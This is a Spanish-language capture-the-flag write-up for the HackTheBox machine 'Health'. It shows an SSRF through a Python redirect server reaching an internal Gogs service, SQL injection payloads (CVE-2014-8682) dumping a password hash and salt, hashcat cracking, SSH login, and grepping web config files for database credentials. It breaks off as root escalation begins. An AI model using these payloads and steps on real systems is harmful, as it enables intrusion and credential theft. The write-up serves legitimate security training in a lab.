---
title: "HTB: Resolución de Health"
date: 2023-01-07 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [gogs,sqli,ssrf,webhook,hashcat,cve-2014-8682]     ## TAG names should always be lowercase
image: htb.jpg
img_path: /photos/2023-01-07-Health-WriteUp/
---

***Health*** es una máquina *Linux* donde primero explotaremos un ***SSRF*** a través de un ***HTTP redirect*** para conseguir acceder a un servicio web interno de la máquina víctima, ***Gogs***. Posteriormente, conseguiremos explotar un ***SQL Injection*** asociado a este sistema de control de versiones. Para escalar a ***root***, nos aprovecharemos de una **mala implementación** del servicio web, pudiendo así listar la **clave privada SSH** del usuario ***root***.


## Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="logo.png" alt="drawing" width="465"/>  
        </td>
        <td>
            <img src="stats.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>


## Reconocimiento

### ping

En primer lugar enviaremos un _ping_ a la máquina víctima para conocer su sistema operativo y saber si tenemos conexión con ella. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_. Por otra parte, un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
ping -c 1 10.10.11.176
PING 10.10.11.176 (10.10.11.176) 56(84) bytes of data.
64 bytes from 10.10.11.176: icmp_seq=1 ttl=63 time=57.6 ms

--- 10.10.11.176 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 57.624/57.624/57.624/0.000 ms
```

Nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port discovery

A continución procedemos a escanear todo el rango de puertos de la máquina víctima. Lo haremos con la herramienta ***nmap***.

```bash
nmap -sS --min-rate 5000 -n -Pn -vvv -p- 10.10.11.176 -oG allPorts
Nmap scan report for 10.10.11.176
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE REASON
22/tcp   open     ssh     syn-ack ttl 63
80/tcp   open     http    syn-ack ttl 63
3000/tcp filtered ppp     no-response
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero **allPorts** en este caso.

Hemos encontrado **dos puertos abiertos**, el **22** y el **80**, y un **puerto filtrado**, el **3000**. 

Un **puerto abierto** es un puerto en un servidor que está **escuchando solicitudes de conexión entrantes**. 

Un **puerto filtrado** es un puerto que está **protegido por un cortafuegos** o por otro tipo de medida de seguridad que bloquea las solicitudes de conexión entrantes. 

De momento, desde el exterior, no podremos hacer nada con el puerto 3000, pero está bien saberlo por si en un futuro ganamos acceso a la máquina.

Ahora, lanzaremos una serie de _scripts_ básicos de enumeración contra los **puertos abiertos**, en busca de los servicios que están corriendo y de sus versiones.

```bash
nmap -sCV -p22,80 10.10.11.176 -oN targeted
Nmap scan report for 10.10.11.176
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HTTP Monitoring Tool
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, como no disponemos de credenciales para autenticarnos contra _SSH_, nos centraremos en auditar el puerto 80.

### Puerto 80 abierto (HTTP)

#### Tecnologías utilizadas

Vamos a utilizar **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

```python
whatweb 10.10.11.176
http://10.10.11.176 [200 OK] Apache[2.4.29], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], Email[contact@health.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.176], Laravel, Script[text/js], Title[HTTP Monitoring Tool], X-UA-Compatible[ie=edge]
```

* Como servidor web está empleando *Apache 2.4.29.*
* También está utilizando *Laravel*, que es un *Framework* en *PHP* para aplicaciones web.
* Vemos un subdominio ***health.htb***. Lo podemos incluir en nuestro archivo */etc/hosts*, ya que a lo mejor se está aplicando *virtual hosting* y en ese caso no veríamos la misma web utilizando la IP que utilizando el dominio.  Lo podemos añadir al final del archivo de la siguiente manera:

```
10.10.11.176 soccer.htb
```

En este caso, dominio e IP apuntan a la misma página web.

#### Inspeccionando la web

Como se indica en la descripción de la página web, se trata de un portal que permite verificar si un sitio web está disponible o no. De los 4 campos disponibles para rellenar, los dos primeros son los importantes:

* El primer campo, ***payload url***, es una URL donde recibiremos información sobre una URL monitorizada (***monitored url***). Esta información incluye si la web está disponible, el contenido de la misma, información sobre el servidor…
* El segundo campo, ***monitored url***, será la *URL* del sitio web del que queramos obtener información.

Adjunto la siguiente imagen a modo de **esquema**:

![imagen 1](Pasted image 20230103184412.png)

Con un **servidor de python** desplegaremos la web que será monitorizada y con *netcat* nos pondremos en escucha para recibir información relativa a esta web.

Para la web monitorizada el comando será:

```bash
python3 -m http.server 80
```

Esto nos montará un servicio web en *http://\<IP_tun0\>:80*, en mi caso http://10.10.14.11:80.

Para ponernos en escucha y recibir información de http://10.10.14.11:80 haremos:

```bash
nc -nlvp 81
```

Ahora, estamos en escucha por http://10.10.14.11:81.

Quedaría de la siguiente manera:

![imagen 2](Pasted image 20230103120548.png)


Si clicamos en ***Test***:

![imagen 3](Pasted image 20230103120646.png)

Recibiremos un *get* a nuestro servidor http://10.10.14.11.

![imagen 4](Pasted image 20230103120704.png)

Y un *post* a nuestro servidor http://10.10.14.11:81

La información que se envía por *post* es la siguiente:

```json
{
  "webhookUrl": "http://10.10.14.11:81",
  "monitoredUrl": "http://10.10.14.11:80",
  "health": "up",
  "body": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title>Directory listing for /</title>\n</head>\n<body>\n<h1>Directory listing for /</h1>\n<hr>\n<ul>\n<li><a href=\"allPorts\">allPorts</a></li>\n<li><a href=\"targeted\">targeted</a></li>\n</ul>\n<hr>\n</body>\n</html>\n",
  "message": "HTTP/1.0 200 OK",
  "headers": {
    "Server": "SimpleHTTP/0.6 Python/3.9.2",
    "Date": "Tue, 03 Jan 2023 10:45:14 GMT",
    "Content-type": "text/html; charset=utf-8",
    "Content-Length": "379"
  }
}
```

*health up* nos indica que la web está activa y *body* contiene el cuerpo HTML de la web (en este caso, el contenido del directorio donde he montado mi servidor python). Si lo *parseamos*, el cuerpo es el siguiente:

```html
<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">
<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href=\"allPorts\">allPorts</a></li>
<li><a href=\"targeted\">targeted</a></li>
</ul>
<hr>
</body>
</html>
```


## Consiguiendo shell como susanne

### Ataque Server Side Request Forgery (SSRF)

¿Qué pasaría si pudiésemos monitorizar una URL de la máquina víctima, por ejemplo, http://health.htb? Tendriamos acceso a su código HTML. En este caso, ya lo podemos visualizar sin necesidad de tener que monitorizarla, pero, ¿Y si corre otro servicio web en otro puerto de la máquina víctima en el que no tenemos acceso desde el exterior?

Un ataque ***SSRF (Server-Side Request Forgery)*** es una técnica utilizada por atacantes para forzar a un servidor web a realizar solicitudes de red a direcciones IP o dominios específicos. Esto permite a los atacantes acceder a **información confidencial** o llevar a cabo acciones malintencionadas **en nombre del servidor**.

En este caso, lograremos como atacantes que el servidor web víctima envíe una solicitud a un servicio interno, que normalmente no estaría disponible para acceso externo.

#### Preparando el ataque

Parece que la web está debidamente *securizada* para que no podamos apuntar a servicios internos. Después de probar con los siguientes ***monitored url***:

* http://10.10.11.176
* http://localhost
* http://127.0.0.1
* http://0.0.0.0
* http://0x7F000001

Obtenemos el siguiente mensaje:

![imagen 5](Pasted image 20230103123235.png)


Esta sería la representación de lo que está pasando:

![imagen 6](Pasted image 20230103190148.png)


#### SSRF aprovechándonos de un HTTP redirect

Para intentar **burlar** la protección anterior, podríamos hacer que el servicio web monitorizara una web nuestra y luego redirigir el tráfico con un ***redirect*** a un servicio interno.

Por lo tanto, la web monitorizada sería http://10.10.14.11, pero luego esta redirigiría la petición a, por ejemplo, http://10.10.11.176.

El código para desplegarnos un servidor que redireccione una petición a donde le indiquemos es el siguiente:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'https://example.com/nueva-direccion')
        self.end_headers()

httpd = HTTPServer(('0.0.0.0', 80), RedirectHandler)
httpd.serve_forever()
```

Podemos sustituir https://example.com/nueva-direccion por http://10.10.11.176.

Igual que antes, para monitorizar la web, sería ejecutar el *script* anterior. Esto nos montará un servicio web en *http://\<IP_tun0\>:80*, en mi caso http://10.10.14.11:80.

Para ponernos en escucha y recibir información de http://10.10.14.11:80 haremos:

```bash
nc -nlvp 81
```

Rellenamos el formulario, clicamos en ***Test*** y recibiremos la siguiente información:

```json
{
  "webhookUrl": "http://10.10.14.11:81",
  "monitoredUrl": "http://10.10.14.11",
  "health": "up",
  "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>HTTP Monitoring Tool</title>\n    <link href=\"http://10.10.11.176/css/app.css\" rel=\"stylesheet\" type=\"text/css\"/>\n</head>\n<body>\n<div class=\"container\">\n        <div class=\"container\" style=\"padding: 150px\">\n\n\t<h1 class=\"text-center\">health.htb</h1>\n\t<h4 class=\"text-center\">Simple health checks for any URL</h4>\n\n\t<hr>\n\n\n\n\n\t<p>This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.</p>\n\n\t<div class=\"card-header\">\n\t    Configure Webhook\n\t</div>\n\n\n\t\n\t\n\t\n\t<div class=\"mx-auto\" style=\"width: 700px; padding: 20px 0 70px 0\">\n\t    <form method=\"post\" action=\"http://10.10.11.176/webhook\">\n\t\t<input type=\"hidden\" name=\"_token\" value=\"HYeCyuOcKXIjq6jpON9wr2SFO0RzFyMumzxW0sZD\">\n\t\t<div class=\"pt-2 form-group\">\n\t\t    <label for=\"webhookUrl\">Payload URL:</label>\n\t\t    <input type=\"text\" class=\"form-control\" name=\"webhookUrl\"\n\t\t\t   placeholder=\"http://example.com/postreceive\"/>\n\t\t</div>\n\n\t\t<div class=\"pt-2 form-group\">\n\t\t    <label for=\"monitoredUrl\">Monitored URL:</label>\n\t\t    <input type=\"text\" class=\"form-control\" name=\"monitoredUrl\" placeholder=\"http://example.com\"/>\n\t\t</div>\n\n\t\t<div class=\"pt-2 form-group\">\n\t\t    <label for=\"frequency\">Interval:</label>\n\t\t    <input type=\"text\" class=\"form-control\" name=\"frequency\" placeholder=\"*/5 * * * *\"/>\n\t\t    <small class=\"form-text text-muted\">Please make use of cron syntax, see <a\n\t\t\t    href=\"https://crontab.guru/\">here</a> for reference.</small>\n\t\t</div>\n\n\t\t<p class=\"pt-3\">Under what circumstances should the webhook be sent?</p>\n\n\t\t<select class=\"form-select\" name=\"onlyError\">\n\t\t    <option value=\"1\" selected>Only when Service is not available</option>\n\t\t    <option value=\"0\">Always</option>\n\t\t</select>\n\n\t\t<div class=\"pt-2\">\n\t\t    <input type=\"submit\" class=\"btn btn-primary float-end\" name=\"action\"\n\t\t\t   value=\"Create\"/>\n\t\t    <input type=\"submit\" class=\"btn btn-success float-end\" style=\"margin-right: 2px\" name=\"action\"\n\t\t\t   value=\"Test\"/>\n\t\t</div>\n\n\t    </form>\n\t</div>\n\n\t<h4>About:</h4>\n<p>This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.</p>\n\t<h4>For Developers:</h4>\n<p>Once the webhook has been created, the webhook recipient is periodically informed about the status of the monitored application by means of a post request containing various details about the http service.</p>\n\t<h4>Its simple:</h4>\n\t<p>No authentication is required. Once you create a monitoring job, a UUID is generated which you can share\n\t    with\n\t    others to manage the job easily.</p>\n\n    </div>\n</div>\n<script src=\"http://10.10.11.176/js/app.js\" type=\"text/js\"></script>\n\n\n<!-- Footer -->\n<footer class=\"text-center text-lg-start bg-light text-muted\">\n    <!-- Section: Social media -->\n    <section\n        class=\"d-flex justify-content-center justify-content-lg-between p-4 border-bottom\"\n    >\n\n        <!-- Left -->\n\n        <!-- Right -->\n        <div>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-facebook-f\"></i>\n            </a>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-twitter\"></i>\n            </a>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-google\"></i>\n            </a>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-instagram\"></i>\n            </a>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-linkedin\"></i>\n            </a>\n            <a href=\"\" class=\"me-4 text-reset\">\n                <i class=\"fab fa-github\"></i>\n            </a>\n        </div>\n        <!-- Right -->\n    </section>\n    <!-- Section: Social media -->\n\n    <!-- Section: Links  -->\n    <section class=\"\">\n        <div class=\"container text-center text-md-start mt-5\">\n            <!-- Grid row -->\n            <div class=\"row mt-3\">\n                <!-- Grid column -->\n                <div class=\"col-md-3 col-lg-4 col-xl-3 mx-auto mb-4\">\n                    <!-- Content -->\n                    <h6 class=\"text-uppercase fw-bold mb-4\">\n                        <i class=\"fas fa-gem me-3\"></i>health.htb\n                    </h6>\n                </div>\n                <!-- Grid column -->\n\n                <!-- Grid column -->\n                <div class=\"col-md-2 col-lg-2 col-xl-2 mx-auto mb-4\">\n                    <!-- Links -->\n                    <h6 class=\"text-uppercase fw-bold mb-4\">\n                        Products\n                    </h6>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Angular</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">React</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Vue</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Laravel</a>\n                    </p>\n                </div>\n                <!-- Grid column -->\n\n                <!-- Grid column -->\n                <div class=\"col-md-3 col-lg-2 col-xl-2 mx-auto mb-4\">\n                    <!-- Links -->\n                    <h6 class=\"text-uppercase fw-bold mb-4\">\n                        Useful links\n                    </h6>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Pricing</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Settings</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Orders</a>\n                    </p>\n                    <p>\n                        <a href=\"#!\" class=\"text-reset\">Help</a>\n                    </p>\n                </div>\n                <!-- Grid column -->\n\n                <!-- Grid column -->\n                <div class=\"col-md-4 col-lg-3 col-xl-3 mx-auto mb-md-0 mb-4\">\n                    <!-- Links -->\n                    <h6 class=\"text-uppercase fw-bold mb-4\">\n                        Contact\n                    </h6>\n                    <p><i class=\"fas fa-home me-3\"></i> New York, NY 10012, US</p>\n                    <p>\n                        <i class=\"fas fa-envelope me-3\"></i>\n                        contact@health.htb\n                    </p>\n                    <p><i class=\"fas fa-phone me-3\"></i> + 01 234 567 88</p>\n                    <p><i class=\"fas fa-print me-3\"></i> + 01 234 567 89</p>\n                </div>\n                <!-- Grid column -->\n            </div>\n            <!-- Grid row -->\n        </div>\n    </section>\n    <!-- Section: Links  -->\n\n    <!-- Copyright -->\n    <div class=\"text-center p-4\" style=\"background-color: rgba(0, 0, 0, 0.05);\">\n        © 2014 Copyright:\n        <a class=\"text-reset fw-bold\" href=\"http://health.htb\">health.htb</a>\n    </div>\n    <!-- Copyright -->\n</footer>\n<!-- Footer -->\n\n</body>\n</html>\n",
  "message": "HTTP/1.0 301 Moved Permanently",
  "headers": {
    "Server": "Apache/2.4.29 (Ubuntu)",
    "Date": "Tue, 03 Jan 2023 11:47:37 GMT",
    "Location": "http://10.10.11.176",
    "Cache-Control": "private, must-revalidate",
    "pragma": "no-cache",
    "expires": "-1",
    "Set-Cookie": "laravel_session=eyJpdiI6IlhadG9KOXVnMEh5RXdNTXUyY2RleXc9PSIsInZhbHVlIjoiZ2Vka05aalk2bDJZeFRNYXdnQ0tDVnZSVExOS3R4TGJNK0xSbFp6bnR1UmowMFJmY2ZUMFpmYjRwd3VlOWhBT3FRTy9XcE1YR0czdnVXd2JsZGZ0QlVzUzRmbkFiQkxsNW1xdCtaZDFubnBGL2U1WUJJMWx0K0RBWVc2d1YvdEMiLCJtYWMiOiJjOTAxOWFmODZiZGQ4NWQ2NDNjMDJmMjI1NzdmNGFiOTlkNTc3MTVhMGE2M2FhMjNiMjY2NDU5Y2FkODVhMzFiIiwidGFnIjoiIn0%3D; expires=Tue, 03-Jan-2023 13:47:37 GMT; Max-Age=7200; path=/; httponly; samesite=lax",
    "Vary": "Accept-Encoding",
    "Content-Length": "7350",
    "Connection": "close",
    "Content-Type": "text/html; charset=UTF-8"
  }
}
```

Es el código fuente http://health.htb. **El SSRF ha funcionado**.

### Auditando Puerto 3000

Recordemos, que en el escaneo de puerto descubrimos el **puerto 3000 filtrado**. Esto quería decir que estaba protegido por un cortafuegos y no podíamos acceder al servicio desde el exterior. Pero, ahora, **estamos tramitando solicitudes desde el interior con el *SSRF***, por lo que el cortafuegos no actuará.

Lo que vamos a hacer es utilizar el *script* de *python* para redirigir la petición a http://10.10.11.176:3000.

El esquema quedaría:

![imagen 7](Pasted image 20230103190240.png)

El script para redireccionar la petición es el siguiente:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://10.10.11.176:3000')
        self.end_headers()

httpd = HTTPServer(('0.0.0.0', 80), RedirectHandler)
httpd.serve_forever()
```

Rellenamos todos los campos, clicamos en ***Test*** y obtendremos en siguiente *body* (Después de recibir la respuesta por http://10.10.14.11:81, la he guardado en un archivo *info.txt* y le he aplicado el siguiente *oneliner* para obtener la información importante):

```bash
cat info.txt | jq .body | sed 's/\\n/\n/g' | sed 's/\\t/\t/g' | html2text | sed '/^\s*$/d'
```

Obtenemos:

```python
 Go Git Service\" />
 a painless self-hosted Git Service written in Go\" />
 self-hosted, gogs\">
" href=\"/img/favicon.png\" />
Please enable JavaScript in your browser!
" id=\"header-nav\">
">
  Help
">
  Explore
">
[\"logo\"]
****** Gogs ******
***** A painless self-hosted Git service written in Go *****
[Unknown INPUT type]
" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-
mail\"/>
" name=\"password\" type=\"password\" placeholder=\"Password\"/> [Unknown INPUT
type]
">Sign In
" id=\"register-button\">Register
 
">
">
">
 Easy to install
Simply run_the_binary for your platform. Or ship Gogs with Docker or Vagrant,
or get it packaged.
">
">
 Cross-platform
Gogs runs anywhere Go can compile for: Windows, Mac OS X, Linux, ARM, etc.
Choose the one you love!
">
">
 Lightweight
Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi.
Save your machine energy!
">
">
 Open Source
It's all on GitHub! Join us by contributing to make this project even better.
Don't be shy to be a contributor!
">
Â© 2014 GoGits Â· Version: 0.5.5.1010 Beta Â· Page: 1ms Â· Template: 1ms
">
">
">
">
">Language
">
English
ç®ä½ä¸æ
ç¹é«ä¸æ
Deutsch
FranÃ§ais
Nederlands
Website Go1.3.2
```

Vemos que **en el puerto 3000 está corriendo *Gogs 0.5.5.1010***. *Gogs* es un sistema de control de versiones de código abierto basado en *Git*. Si buscamos *exploits* en *searchsploit* nos salen varios reportes de ***SQL Injection***:

```bash
$> searchsploit gogs
Gogs - 'label' SQL Injection
Gogs - 'users'/'repos' '?q' SQL Injection
```

#### Gogs SQL Injection (CVE-2014-8682)

##### Encontrando la vulnerabilidad

[Aquí](https://www.exploit-db.com/exploits/35238) podemos ver el reporte de la vulnerabilidad. La parte de código vulnerable es la siguiente:

```go
models/user.go:
[...]

func SearchUserByName(opt SearchOption) (us []*User, err error) {
    opt.Keyword = FilterSQLInject(opt.Keyword)
    if len(opt.Keyword) == 0 {
        return us, nil
    }
    opt.Keyword = strings.ToLower(opt.Keyword)

    us = make([]*User, 0, opt.Limit)
    err = x.Limit(opt.Limit).Where("type=0").And("lower_name like '%" +
opt.Keyword + "%'").Find(&us)
    return us, err
}
[...]
```

Este fragmento de código devuelve todos aquellos usuarios que contengan en su nombre una *keyword*. Esa *keyword* será nuestro input.

La petición es la siguiente:

```python
http://10.10.11.176/api/v1/users/search?q=TEST
```

La palabra **TEST** se sustituirá directamente en ***opt.keyword***. Esto lo hace vulnerable a SQLI, ya que por ejemplo el *input* no se está **sanitizando**.

##### Explotando SQLI

Podríamos construir una petición maliciosa de la siguiente manera:

```python
http://10.10.11.176:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-
```

* **')** se emplea para cerrar la comilla y el paréntesis abiertos de la *query* principal.
* ***union all select*** incluye todas las filas, incluso si hay duplicados.
* ***/\*\*/*** es una forma de representación del espacio, ya que el espacio como tal no se puede usar.
* Los **27 campos** es porque la tabla *users* está formada por 27 columnas. Sabemos que son 27 por el reporte citado anteriormente.
* **-- -** sirve para comentar todo lo que hay en la derecha. En este caso estaríamos comentando:

```
+ "%'").Find(&us)
```

El ***output*** obtenido es el siguiente;

```json
[
  {
    "username": "susanne",
    "avatar": "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"
  },
  {
    "username": "3",
    "avatar": "//1.gravatar.com/avatar/15"
  }
]
```

Descubrimos un usuario llamado ***susanne***.

Vemos que el número **3** de nuestra *query* se está representado en el resultado. Este es el campo **inyectable**. En este campo meteremos nuestro *payload* malicioso para volcar información de la base de datos. Ahora, para saber el nombre de las columnas de la tabla *user* y poder así obtener información, deberemos consultar el **código fuente** de [gogs 0.5.8](https://github.com/gogs/gogs/releases/tag/v0.5.8).

La tabla *users* se encuentra en el archivo *users.go* y contiene los **siguientes campos**:

```go
// User represents the object of individual and member of organization.
type User struct {
	Id            int64
	LowerName     string `xorm:"UNIQUE NOT NULL"`
	Name          string `xorm:"UNIQUE NOT NULL"`
	FullName      string
	Email         string `xorm:"UNIQUE NOT NULL"`
	Passwd        string `xorm:"NOT NULL"`
	LoginType     LoginType
	LoginSource   int64 `xorm:"NOT NULL DEFAULT 0"`
	LoginName     string
	Type          UserType
	Orgs          []*User       `xorm:"-"`
	Repos         []*Repository `xorm:"-"`
	NumFollowers  int
	NumFollowings int
	NumStars      int
	NumRepos      int
	Avatar        string `xorm:"VARCHAR(2048) NOT NULL"`
	AvatarEmail   string `xorm:"NOT NULL"`
	Location      string
	Website       string
	IsActive      bool
	IsAdmin       bool
	AllowGitHook  bool
	Rands         string    `xorm:"VARCHAR(10)"`
	Salt          string    `xorm:"VARCHAR(10)"`
	Created       time.Time `xorm:"CREATED"`
	Updated       time.Time `xorm:"UPDATED"`

	// For organization.
	Description string
	NumTeams    int
	NumMembers  int
	Teams       []*Team `xorm:"-"`
	Members     []*User `xorm:"-"`
}
```

Son un total de **27 campos**. De ahí que nuestra *query* maliciosa fuera del 1 al 27. Los campos que nos interesan son ***Passwd*** y ***Salt***. Con estos dos podremos formar un *hash* que posteriormente lo podremos intentar *crackear* por fuerza bruta.

La *query* para obtener la **contraseña** será la siguiente:

```python
http://10.10.11.176:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,passwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/User--/**/-
```

Aquí el resultado:

```json
[
  {
    "username": "susanne",
    "avatar": "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"
  },
  {
    "username": "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37",
    "avatar": "//1.gravatar.com/avatar/15"
  }
]
```

La *query* para obtener el ***salt*** será la siguiente:

```python
http://10.10.11.176:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/User--/**/-
```

Y aquí el resultado:

```json
[
  {
    "username": "susanne",
    "avatar": "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"
  },
  {
    "username": "sO3XIbeW14",
    "avatar": "//1.gravatar.com/avatar/15"
  }
]
```

##### Reconstruyendo el hash

Ahora debemos darle **formato** a la información obtenida para formar un ***hash*** y luego poderlo *crackear* por fuerza bruta con la herramienta *hashcat*.

En el código podemos encontrar la **función** que se utiliza para **codificar** la contraseña de un usuario:

```go
// EncodePasswd encodes password to safe format.
func (u *User) EncodePasswd() {
	newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
	u.Passwd = fmt.Sprintf("%x", newPasswd)
}
```

Está utilizando ***PBKDF2-SHA256***. Podemos ir a [esta web](https://hashcat.net/wiki/doku.php?id=example_hashes) y buscar el formato de hash conveniente. Utilizaremos el modo 10900. Muestran el siguiente **ejemplo**:

```
10900 | PBKDF2-HMAC-SHA256 | sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```

Este formato sigue el siguiente patrón:

* *hash_algorithm* --> sha256.
* *iterations* --> 10000. Lo podemos ver en el código anterior.
* *salt* --> Deberemos pasar el *salt* a base64.
* *hash* --> Nuestro *hash* está en hexadecimal. Debemos convertir la representación en hexadecimal y luego pasarlo a base64.

El procedimiento para darle formato al *hash* es el siguiente:

```bash
$> echo -n "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37" | xxd -ps -r | base64
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

El procedimiento para darle formato al *salt* es el siguiente:

```bash
$> echo -n "sO3XIbeW14" | base64
c08zWEliZVcxNA==
```

Lo concatenamos todo y obtenemos:

```bash
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

##### Hashcat para romper el hash

Emplearemos ***hashcat*** para *crackear* el hash. ***Hashcat*** es una herramienta de recuperación de contraseñas que emplea diferentes algoritmos de *hashing* (codificación) para tratar de calcular las contraseñas originales a partir de *hashes*.

El comando será el siguiente:

```bash
hashcat -m 10900 -a 0 -d 1 -w 3 hash /usr/share/wordlists/rockyou.txt
```

* *-m* para indicar el modo. Como ya hemos comentado, utilizaremos el 10900.
* *-a* para especificar el ataque. En este caso 0 es una ataque por diccionario básico.
* *-d* para indicarle el hardware que queremos utilizar para romper el *hash*.
* *-w* para asignar el nivel de prioridad que se le asignará a la tarea. En este caso hemos asignado 3, que es alta.
* *hash* es el archivo que contiene el *hash*.
* */usr/share/wordlists/rockyou.txt* es el diccionario de contraseñas que estaremos utilizando.

Pasado un tiempo obtendremos la siguiente **contraseña**:

```bash
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
```

Seguidamente, podemos intentar conectarnos por *SSH* con las credenciales: ***susanne:february15***

### user.txt

En el ***homedir*** de *susanne* encontraremos la primera *flag*:

```bash
susanne@health:~$ cat user.txt
f2eda025c84012295e2a11da2a7d1023
```

## Consiguiendo shell como root

### Reconocimiento del sistema como susanne

Podemos buscar **contraseñas** que se estén almacenando en texto plano en el directorio donde se encuentran todos los archivos de configuración de la web:

```bash
susanne@health:/var/www/html$ grep -rniE "pass|pwd|PASSWORD" | grep -v "node_modules"|less -S
```

Encontramos la siguiente contraseña en el archivo *.env*: ***MYsql_strongestpass@2014+***. Si investigamos este archivo, encontramos las siguientes **credenciales**:

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

En este punto podemos intentar conectarnos por ***MySQL***:

```bash
susanne@health:/var/www/html$ mysql -u laravel -pMYsql_strongestpass@2014+
```

Tenemos acceso a una **base de datos** llamada *laravel* que contiene unas cuantas tablas.

#### Reconocimiento del sistema con pspy

**_Pspy_** es una herramienta que nos permite ver qué tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).

